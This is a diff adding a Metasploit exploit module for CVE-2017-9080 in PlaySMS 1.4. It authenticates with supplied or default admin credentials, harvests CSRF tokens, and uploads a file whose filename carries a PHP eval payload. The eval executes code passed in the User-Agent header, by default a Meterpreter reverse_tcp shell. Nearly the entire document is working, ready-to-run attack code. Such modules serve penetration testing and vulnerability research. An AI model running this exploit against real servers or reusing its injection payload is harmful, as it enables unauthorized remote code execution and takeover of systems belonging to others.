@@ -1,0 +1,189 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution',
+      'Description' => %q{
+          This module exploits a code injection vulnerability within an authenticated file
+          upload feature in PlaySMS v1.4. This issue is caused by improper file name handling
+          in sendfromfile.php file.
+          Authenticated Users can upload a file and rename the file with a malicious payload.
+          This module was tested against PlaySMS 1.4 on VulnHub's Dina 1.0 machine and Windows 7.
+      },
+      'Author' =>
+        [
+          'Touhid M.Shaikh <touhidshaikh22[at]gmail.com>', # Discoverys and Metasploit Module
+          'DarkS3curity' # Metasploit Module
+        ],
+      'License' => MSF_LICENSE,
+      'References' =>
+        [
+          ['EDB','42003'],
+          ['CVE','2017-9080'],
+          ['URL','https://www.youtube.com/watch?v=MuYoImvfpew'],
+          ['URL','http://touhidshaikh.com/blog/?p=336']
+        ],
+      'DefaultOptions' =>
+        {
+          'SSL'     => false,
+          'PAYLOAD' => 'php/meterpreter/reverse_tcp',
+          'ENCODER' => 'php/base64',
+        },
+      'Privileged' => false,
+      'Platform'   => ['php'],
+      'Arch'       => ARCH_PHP,
+      'Targets' =>
+        [
+          [ 'PlaySMS 1.4', { } ],
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'May 21 2017'))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, "Base playsms directory path", '/']),
+        OptString.new('USERNAME', [ true, "Username to authenticate with", 'admin']),
+        OptString.new('PASSWORD', [ true, "Password to authenticate with", 'admin'])
+      ])
+  end
+
+  def uri
+    return target_uri.path
+  end
+
+  def check
+    begin
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(uri, 'index.php')
+      })
+    rescue
+      vprint_error('Unable to access the index.php file')
+      return CheckCode::Unknown
+    end
+
+    if res.code == 302 && res.headers['Location'].include?('index.php?app=main&inc=core_auth&route=login')
+      return Exploit::CheckCode::Appears
+    end
+
+    CheckCode::Safe
+  end
+
+  def login
+    res = send_request_cgi({
+      'uri' => normalize_uri(uri, 'index.php'),
+      'method' => 'GET',
+      'vars_get' => {
+        'app' => 'main',
+        'inc' => 'core_auth',
+        'route' => 'login',
+      }
+    })
+
+    # Grabbing CSRF token from body
+    /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
+    vprint_good("X-CSRF-Token for login : #{csrf}")
+
+    cookies = res.get_cookies
+    vprint_status('Trying to Login ......')
+    # Send Creds with cookies.
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(uri, 'index.php'),
+      'cookie' => cookies,
+      'vars_get' => Hash[{
+        'app' => 'main',
+        'inc' => 'core_auth',
+        'route' => 'login',
+        'op' => 'login',
+      }.to_a.shuffle],
+      'vars_post' => Hash[{
+        'X-CSRF-Token' => csrf,
+        'username' => datastore['USERNAME'],
+        'password' => datastore['PASSWORD']
+      }.to_a.shuffle],
+    })
+
+    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?
+
+    # Try to access index page with authenticated cookie.
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(uri, 'index.php'),
+      'cookie' => cookies,
+    })
+
+    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?
+
+    # if we redirect to core_welcome dan we assume we have authenticated cookie.
+    if res.code == 302 && res.headers['Location'].include?('index.php?app=main&inc=core_welcome')
+      print_good("Authentication successful : [ #{datastore['USERNAME']} : #{datastore['PASSWORD']} ]")
+      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])
+      return cookies
+    else
+      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed :[ #{datastore['USERNAME']}:#{datastore['PASSWORD']} ]")
+    end
+  end
+
+  def exploit
+    cookies = login
+
+    # Agian CSRF token.
+    res = send_request_cgi({
+      'uri' => normalize_uri(uri, 'index.php'),
+      'method' => 'GET',
+      'cookie' => cookies,
+      'vars_get' => Hash[{
+        'app' => 'main',
+        'inc' => 'feature_sendfromfile',
+        'op' => 'list',
+      }.to_a.shuffle]
+    })
+
+    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?
+
+    # Grabbing CSRF token from body.
+    /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
+    vprint_good("X-CSRF-Token for upload : #{csrf}")
+
+    # Payload.
+    evilname = "<?php $t=$_SERVER['HTTP_USER_AGENT']; eval($t); ?>"
+
+    # setup POST request.
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(csrf, content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name="X-CSRF-Token"') # CSRF token
+    post_data.add_part("#{rand_text_alpha(8 + rand(5))}", content_type = 'application/octet-stream', transfer_encoding = nil, content_disposition = "form-data; name=\"fncsv\"; filename=\"#{evilname}\"")  # payload
+    post_data.add_part("1", content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name="fncsv_dup"')  # extra
+    data = post_data.to_s
+
+    vprint_status('Trying to upload file with malicious Filename Field....')
+    # Lets Send Upload request.
+    res = send_request_cgi({
+      'uri' => normalize_uri(uri, 'index.php'),
+      'method' => 'POST',
+      'agent' => payload.encode,
+      'cookie' => cookies,
+      'vars_get' => Hash[{
+        'app' => 'main',
+        'inc' => 'feature_sendfromfile',
+        'op' => 'upload_confirm',
+      }.to_a.shuffle],
+      'headers' => {
+        'Upgrade-Insecure-Requests' => '1',
+      },
+      'Connection' => 'close',
+      'data' => data,
+      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
+    })
+  end
+end
